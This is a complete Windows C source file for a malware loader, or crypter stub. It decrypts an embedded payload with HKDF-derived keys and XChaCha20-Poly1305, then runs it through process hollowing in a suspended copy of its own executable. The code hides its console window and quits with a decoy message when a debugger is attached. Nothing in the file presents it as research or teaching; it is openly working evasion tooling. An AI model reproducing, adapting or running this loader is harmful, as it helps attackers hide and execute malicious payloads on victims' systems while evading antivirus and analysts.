#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include "crypto/hashing/sha.h"
#include "crypto/chacha20-poly1305/chacha20poly1305.h"

typedef struct {
    unsigned char* payload;
    unsigned char* key;
    unsigned char* nonce;
    unsigned long payloadSize;
    unsigned long keySize;
    unsigned long nonceSize;
} Resources;

typedef struct {
    uint8_t key[32];
    uint8_t nonce[24];
    uint8_t hash[32];
    uint8_t salt[16];
    uint8_t prk[USHAMaxHashSize];
    uint8_t okm[80];
    uint8_t metaNonce[24];
    uint8_t obfKey[32];
    uint8_t obfNonce[24];
} CryptoContext;

typedef struct {
    void* pe;
    void* pImageBase;
    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS64* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;
    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;
    CONTEXT* CTX;
    char currentFilePath[MAX_PATH];
} ProcessContext;

// Function to extract embedded resource from this executable
unsigned char* GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
{
    HGLOBAL hResData;
    HRSRC   hResInfo;
    unsigned char* pvRes;
    HMODULE hModule = GetModuleHandle(NULL);

    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceType)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
    {
        *dwSize = SizeofResource(hModule, hResInfo);
        return pvRes;
    }

    *dwSize = 0; 
    return NULL;
}

static int ProcessHollowing(uint8_t* decrypted, unsigned long payloadSize)
{
    ProcessContext ctx = {0};
    ctx.pe = decrypted;
    ctx.DOSHeader = (PIMAGE_DOS_HEADER)ctx.pe;
    ctx.NtHeader = (IMAGE_NT_HEADERS64*)((uint8_t*)ctx.pe + ctx.DOSHeader->e_lfanew);

    if (ctx.NtHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        return 1;
    }

    GetModuleFileNameA(NULL, ctx.currentFilePath, MAX_PATH);
    
    if (!CreateProcessA(ctx.currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &ctx.SI, &ctx.PI))
    {
        return 1;
    }

    ctx.CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
    if (!ctx.CTX)
    {
        TerminateProcess(ctx.PI.hProcess, 1);
        return 1;
    }

    ctx.CTX->ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(ctx.PI.hThread, ctx.CTX))
    {
        goto cleanup;
    }

    ctx.pImageBase = VirtualAllocEx(
        ctx.PI.hProcess,
        (LPVOID)(ctx.NtHeader->OptionalHeader.ImageBase),
        ctx.NtHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!ctx.pImageBase)
    {
        goto cleanup;
    }

    WriteProcessMemory(ctx.PI.hProcess, ctx.pImageBase, ctx.pe, 
        ctx.NtHeader->OptionalHeader.SizeOfHeaders, NULL);

    for (size_t i = 0; i < ctx.NtHeader->FileHeader.NumberOfSections; i++)
    {
        ctx.SectionHeader = (PIMAGE_SECTION_HEADER)(
            (uint8_t*)ctx.pe + ctx.DOSHeader->e_lfanew + 
            sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER))
        );

        WriteProcessMemory(
            ctx.PI.hProcess,
            (LPVOID)((uintptr_t)ctx.pImageBase + ctx.SectionHeader->VirtualAddress),
            (LPVOID)((uintptr_t)ctx.pe + ctx.SectionHeader->PointerToRawData),
            ctx.SectionHeader->SizeOfRawData,
            NULL
        );
    }

    WriteProcessMemory(
        ctx.PI.hProcess,
        (LPVOID)(ctx.CTX->Rdx + 0x10),
        &ctx.NtHeader->OptionalHeader.ImageBase,
        sizeof(uint64_t),
        NULL
    );

    ctx.CTX->Rcx = (uintptr_t)ctx.pImageBase + ctx.NtHeader->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(ctx.PI.hThread, ctx.CTX);
    ResumeThread(ctx.PI.hThread);
    WaitForSingleObject(ctx.PI.hProcess, INFINITE);

    VirtualFree(ctx.CTX, 0, MEM_RELEASE);
    return 0;

cleanup:
    if (ctx.CTX)
    {
        VirtualFree(ctx.CTX, 0, MEM_RELEASE);
    }
    TerminateProcess(ctx.PI.hProcess, 1);
    return 1;
}

static void cleanup_resources(Resources* res, CryptoContext* crypto, uint8_t* decrypted, unsigned long payloadSize)
{
    if (crypto)
    {
        SecureZeroMemory(crypto->key, sizeof(crypto->key));
        SecureZeroMemory(crypto->nonce, sizeof(crypto->nonce));
    }
    
    if (decrypted)
    {
        SecureZeroMemory(decrypted, payloadSize);
        VirtualFree(decrypted, 0, MEM_RELEASE);
    }
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (IsDebuggerPresent()) {
        OutputDebugStringA("Oops! Unexpected failure.");
        return 1;
    }

    Resources res = {0};
    CryptoContext crypto = {0};
    uint8_t* decrypted = NULL;

    // Load resources
    res.payload = GetResource(132, RT_RCDATA, &res.payloadSize);
    res.key = GetResource(133, RT_RCDATA, &res.keySize);
    res.nonce = GetResource(134, RT_RCDATA, &res.nonceSize);

    if ((res.payload == NULL || res.payloadSize == 0) ||
        (res.key == NULL || res.keySize != 32) ||
        (res.nonce == NULL || res.nonceSize != 24)) {
        return 1;
    }

    // Calculate hash and derive keys
    SHA256Context shaCtx;
    SHA256Reset(&shaCtx);
    SHA256Input(&shaCtx, res.payload, res.payloadSize);
    SHA256Result(&shaCtx, crypto.hash);
    memcpy(crypto.salt, crypto.hash, 16);

    // HKDF key derivation
    HKDFContext hkdfCTX;
    memset(&hkdfCTX, 0, sizeof(hkdfCTX));
    if (hkdfReset(&hkdfCTX, SHA256, crypto.salt, 16) != 0 ||
        hkdfInput(&hkdfCTX, crypto.hash, 32) != 0 ||
        hkdfResult(&hkdfCTX, crypto.prk, (const uint8_t *)"obfuscation-context", 
            (int)strlen("obfuscation-context"), crypto.okm, 80) != 0)
    {
        goto cleanup;
    }

    memcpy(crypto.obfKey, crypto.okm, 32);
    memcpy(crypto.metaNonce, crypto.okm + 56, 24);

    // Decrypt key and nonce
    chacha20poly1305_ctx obfCtx;
    xchacha20poly1305_init(&obfCtx, crypto.obfKey, crypto.metaNonce);
    chacha20poly1305_decrypt(&obfCtx, res.key, crypto.key, 32);
    chacha20poly1305_decrypt(&obfCtx, res.nonce, crypto.nonce, 24);

    // Decrypt payload
    decrypted = (uint8_t*)VirtualAlloc(NULL, res.payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted)
    {
        goto cleanup;
    }

    memcpy(decrypted, res.payload, res.payloadSize);
    chacha20poly1305_ctx decCtx;
    xchacha20poly1305_init(&decCtx, crypto.key, crypto.nonce);
    chacha20poly1305_decrypt(&decCtx, decrypted, decrypted, res.payloadSize);

    // Process hollowing and execution
    int result = ProcessHollowing(decrypted, res.payloadSize);
    if (result == 0)
    {
        cleanup_resources(&res, &crypto, decrypted, res.payloadSize);
        return 0;
    }

cleanup:
    cleanup_resources(&res, &crypto, decrypted, res.payloadSize);
    return 1;
}